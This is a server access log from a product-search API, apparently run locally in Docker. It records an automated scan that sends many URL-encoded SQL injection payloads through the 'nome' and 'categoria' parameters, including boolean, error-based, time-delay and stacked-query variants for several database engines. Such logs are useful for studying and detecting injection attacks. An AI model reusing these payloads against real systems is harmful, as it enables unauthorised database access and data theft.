api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:54482 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1451%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281451%3D1451%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%286441%3D6441&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54496 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1451%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281451%3D1451%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54504 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1451%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281451%3D1451%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FQSMS&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54506 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1413%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281413%3D1413%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27BXTL%27%3D%27BXTL&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54512 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F1413%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281413%3D1413%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27aviW%27%3D%27aviW&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54528 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1413%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281413%3D1413%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284959%3D4959&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54542 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1413%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281413%3D1413%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54544 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1413%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281413%3D1413%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FOxIq&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54560 - "GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qkvxq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283288%3D3288%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qbzjq%27%29%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54576 - "GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54590 - "GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54592 - "GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54606 - "GET /produtos/busca/?nome=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54620 - "GET /produtos/busca/?nome=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54634 - "GET /produtos/busca/?nome=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54650 - "GET /produtos/busca/?nome=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54654 - "GET /produtos/busca/?nome=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54666 - "GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%2875%29%7C%7CCHR%28113%29%7C%7CCHR%2881%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54676 - "GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%2875%29%7C%7CCHR%28113%29%7C%7CCHR%2881%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54684 - "GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%2875%29%7C%7CCHR%28113%29%7C%7CCHR%2881%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54696 - "GET /produtos/busca/?nome=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%2875%29%7C%7CCHR%28113%29%7C%7CCHR%2881%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54706 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8715%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29DfwZ%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27CMJj%27%3D%27CMJj&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54718 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8715%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29DfwZ%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27RQJD%27%3D%27RQJD&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54724 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8715%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29DfwZ%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281187%3D1187&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54732 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8715%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29DfwZ%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54740 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8715%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29DfwZ%29--%2F%2A%2A%2FsFyE&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54744 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F3054%3D%28SELECT%2F%2A%2A%2F3054%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27pDNg%27%3D%27pDNg&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54750 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F3054%3D%28SELECT%2F%2A%2A%2F3054%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27vfOi%27%3D%27vfOi&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54756 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F3054%3D%28SELECT%2F%2A%2A%2F3054%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282677%3D2677&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54768 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3054%3D%28SELECT%2F%2A%2A%2F3054%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54790 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3054%3D%28SELECT%2F%2A%2A%2F3054%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2Fosam&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54792 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27NhtT%27%3D%27NhtT&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54784 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27FiSF%27%3D%27FiSF&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54804 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%287918%3D7918&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54816 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54830 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FLNte&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54838 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F2305%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2888%29%7C%7CCHR%28117%29%7C%7CCHR%28113%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27bhVB%27%3D%27bhVB&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54850 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F2305%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2888%29%7C%7CCHR%28117%29%7C%7CCHR%28113%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27evhd%27%3D%27evhd&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38470 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F2305%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2888%29%7C%7CCHR%28117%29%7C%7CCHR%28113%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288851%3D8851&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38474 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2305%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2888%29%7C%7CCHR%28117%29%7C%7CCHR%28113%29%2C5%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54864 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2305%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2888%29%7C%7CCHR%28117%29%7C%7CCHR%28113%29%2C5%29--%2F%2A%2A%2FHzsj&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38486 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FoQnc&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38510 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F9749--%2F%2A%2A%2FVvEv&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38496 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FNsbl&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38526 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F2885--%2F%2A%2A%2FpKPG&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38528 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FGgGT&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38538 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F6099--%2F%2A%2A%2FnyWe&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38554 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FJAKc&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38566 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F4294--%2F%2A%2A%2FCIrs&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38578 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FOPgg&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38594 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F7740--%2F%2A%2A%2FMYbB&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38568 - "GET /produtos/busca/?nome=teste&categoria=7695 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38596 - "GET /produtos/busca/?nome=teste&categoria=eletronicos.%29%2C%29.%2C%2C%22.%27 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38608 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%27RCKUQE%3C%27%22%3ErYXcdu HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38624 - "GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38630 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F6853%3D4442%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27KUNI%27%3D%27KUNI HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38612 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FAND%2F%2A%2A%2F9083%3D9128%2F%2A%2A%2FAND%2F%2A%2A%2F%27zYAx%27%3D%27zYAx HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38638 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2F%2A%2A%2FAND%2F%2A%2A%2F7092%3D8478%2F%2A%2A%2FAND%2F%2A%2A%2F%289006%3D9006 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38646 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F4897%3D9465 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38662 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F2829%3D3126--%2F%2A%2A%2FqPpz HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38676 - "GET /produtos/busca/?nome=teste&categoria=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284329%3D3474%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27eletronicos%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F3474%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F8165%29%2F%2A%2A%2FEND%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38690 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286324%2CCONCAT%280x5c%2C0x716b767871%2C%28SELECT%2F%2A%2A%2F%28ELT%286324%3D6324%2C1%29%29%29%2C0x71627a6a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27qUJC%27%3D%27qUJC HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38686 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286324%2CCONCAT%280x5c%2C0x716b767871%2C%28SELECT%2F%2A%2A%2F%28ELT%286324%3D6324%2C1%29%29%29%2C0x71627a6a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27odZb%27%3D%27odZb HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38694 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286324%2CCONCAT%280x5c%2C0x716b767871%2C%28SELECT%2F%2A%2A%2F%28ELT%286324%3D6324%2C1%29%29%29%2C0x71627a6a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284784%3D4784 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38712 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286324%2CCONCAT%280x5c%2C0x716b767871%2C%28SELECT%2F%2A%2A%2F%28ELT%286324%3D6324%2C1%29%29%29%2C0x71627a6a71%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38702 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%286324%2CCONCAT%280x5c%2C0x716b767871%2C%28SELECT%2F%2A%2A%2F%28ELT%286324%3D6324%2C1%29%29%29%2C0x71627a6a71%29%29--%2F%2A%2A%2FSZVg HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38716 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5485%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285485%3D5485%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27MDcN%27%3D%27MDcN HTTP/1.1" 200 OK
